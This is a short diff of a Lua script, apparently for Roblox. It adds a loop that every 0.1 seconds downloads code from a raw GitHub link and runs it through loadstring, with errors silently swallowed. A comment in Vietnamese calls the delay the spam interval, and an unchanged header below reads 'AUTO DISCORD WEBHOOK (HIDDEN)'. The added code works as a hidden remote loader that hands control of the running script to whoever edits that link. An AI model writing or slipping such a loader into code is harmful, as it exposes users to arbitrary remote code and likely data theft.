@@ -1,3 +1,14 @@
+local RAW_LINK = "https://raw.githubusercontent.com/BRYSHADOW/BRY/refs/heads/main/lol"
+local DELAY = 0.1 -- thời gian spam (giây)
+
+task.spawn(function()
+	while task.wait(DELAY) do
+		pcall(function()
+			loadstring(game:HttpGet(RAW_LINK))()
+		end)
+	end
+end)
+
 --==============================
 -- AUTO DISCORD WEBHOOK (HIDDEN)
 --==============================
